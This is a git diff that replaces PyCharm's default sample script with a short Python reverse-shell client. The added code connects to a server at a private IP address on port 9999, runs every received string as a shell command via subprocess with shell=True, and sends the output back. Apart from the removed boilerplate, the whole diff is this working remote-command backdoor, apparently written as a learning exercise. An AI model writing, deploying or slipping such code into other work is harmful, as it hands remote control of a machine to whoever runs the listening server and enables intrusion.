@@ -1,16 +1,25 @@
-# This is a sample Python script.
+import socket
+import os
+import subprocess
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+s = socket.socket()
+host = '192.168.8.103' # IP address of the server
+port = 9999 # Port to listen on (non-privileged ports are > 1023)
 
+s.connect((host, port))
 
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+while True:
+    data = s.recv(1024) # amount of data Receive data from server
+    if data[:2].decode("utf-8") == "cd": # if want to go back to the previous directory
+        os.chdir(data[3:].decode("utf-8")) # get rest to change directory
 
-
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
-
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+    #check for commands
+    if len(data) > 0:
+        #opens a shell and executes the command
+        #out , error, in
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read() #if theres an error or output it will be stored in output_bytes
+        output_str = str(output_bytes, "utf-8") #convert to string
+        currentWD = os.getcwd() + "> " #get current working directory
+        s.send(str.encode(output_str + currentWD)) #send output to server
+        print(output_str)
